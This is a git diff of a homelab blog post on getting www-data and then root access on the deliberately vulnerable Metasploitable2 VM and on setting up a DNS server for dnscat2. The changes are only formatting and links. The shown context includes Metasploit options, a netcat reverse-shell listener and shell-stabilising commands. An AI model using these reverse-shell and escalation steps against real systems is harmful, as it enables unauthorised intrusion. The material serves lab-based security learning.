@@ -4,7 +4,7 @@ categories: [homelab]
 tags: [homelab, domain, dns, dnscat2]     # TAG names should always be lowercase
 ---
 
-[home]
+[main](/posts/lab_main)
 ## Gain `root` access on metasploitable2
 ### Gain `www-data` user access:
 ```bash
@@ -22,7 +22,7 @@ set LPORT 80
 run
 ```
 
-### Gaining the root access:
+### Root Access:
 nc listener on attacking machine: `sudo netcat -nlvp 443`
 
 ```bash
@@ -48,11 +48,12 @@ export TERM=xterm
 <ctr+z>
 stty raw -echo; fg
 ```
-==You should have the root access==
+> You should have the root access
+{: .prompt-info}
 
 ## Setup an authoritative DNS server:
-If you are using AWS: [STOK’s video](https://www.youtube.com/watch?v=p8wbebEgtDk)
-Else: (Still, watch that. It's a good learning src.) I made one: 
+If you are using AWS: [STOK’s video](https://youtu.be/p8wbebEgtDk)
+Else, (Still, watch that. It's a good learning src.) I made one: 
 1. Spin up a droplet. [droplet_setup]
 2. Setup domain
 3. Set low ttl for each DNS record type:
